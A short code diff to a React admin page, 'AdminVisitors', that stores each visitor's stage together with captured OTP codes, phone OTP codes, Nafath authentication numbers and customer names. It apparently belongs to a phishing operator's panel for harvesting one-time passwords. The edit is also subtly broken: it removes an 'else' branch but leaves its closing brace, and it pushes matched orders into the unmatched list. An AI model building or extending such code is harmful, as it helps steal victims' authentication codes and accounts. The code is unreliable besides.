@@ -369,7 +369,13 @@ const AdminVisitors = () => {
           );
           if (matched && o.current_stage) {
             stageMap[matched.id] = o.current_stage;
-          } else {
+            pendingOrderDetailsRef.current[matched.id] = {
+              stage: o.current_stage,
+              otp_code: o.otp_code || undefined,
+              phone_otp_code: o.phone_otp_code || undefined,
+              nafath_number: o.nafath_number || undefined,
+              customer_name: o.customer_name || undefined,
+            };
             unmatchedOrders.push(o);
           }
         });
